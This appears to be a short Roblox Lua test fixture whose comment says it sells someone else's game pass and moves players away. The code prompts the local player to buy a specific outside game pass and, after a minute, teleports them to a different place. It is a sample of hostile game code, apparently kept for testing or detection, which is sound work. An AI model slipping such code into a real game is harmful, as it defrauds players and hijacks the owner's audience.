-- TEST FIXTURE. Sells someone else's game pass and moves players away.
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local plr = game:GetService("Players").LocalPlayer
MarketplaceService:PromptGamePassPurchase(plr, 9123456)
task.delay(60, function() TeleportService:Teleport(1818181818, plr) end)
